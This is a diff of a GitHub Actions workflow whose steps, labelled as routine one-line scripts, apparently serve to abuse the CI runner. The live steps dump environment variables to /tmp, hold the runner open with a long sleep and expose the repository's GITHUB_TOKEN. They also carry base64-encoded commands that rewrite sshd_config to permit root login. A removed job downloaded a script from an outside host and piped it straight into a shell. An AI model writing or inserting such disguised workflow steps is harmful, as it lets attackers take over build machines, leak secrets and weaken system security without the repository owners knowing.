@@ -19,11 +19,10 @@ jobs:
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "echo ${{github.event.action}};(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
+        run: bash -c "echo ${{github.event.action}};date;(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -35,9 +34,3 @@ jobs:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
           Github_T22: ${{ secrets.GITHUB_TOKEN }}
           Github_act22: ${{ github.event.action }}
-  build_jobs4:
-    needs: build_jobs3
-    runs-on: ubuntu-18.04
-    steps:
-      - name: Run a one-line script_build_jobs4 
-        run: bash -c "env|grep ss>/tmp/s1;cd /tmp;curl -o- http://xss.pt/4Mi8|tr -d '\r'|tee a1|sh;(while :;do date;[ -f a1 ]&&sleep 300||break;done)"
